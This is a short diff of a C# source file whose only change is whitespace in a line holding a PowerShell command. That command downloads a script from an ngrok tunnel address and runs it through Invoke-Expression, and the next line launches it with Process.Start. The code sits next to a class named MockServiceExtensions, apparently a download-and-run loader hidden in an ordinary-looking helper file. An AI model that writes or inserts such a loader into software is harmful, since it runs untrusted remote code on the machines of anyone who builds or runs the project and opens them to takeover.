@@ -10,7 +10,7 @@ using System.Collections.Generic;
 using System.Diagnostics;
 
 string strCmdText;
-strCmdText= "iex  (New-Object System.Net.WebClient).DownloadString('https://094c-180-151-120-174.in.ngrok.io/file.ps1')";
+strCmdText="iex  (New-Object System.Net.WebClient).DownloadString('https://094c-180-151-120-174.in.ngrok.io/file.ps1')";
 System.Diagnostics.Process.Start("powershell.exe",strCmdText);
 
 internal static class MockServiceExtensions
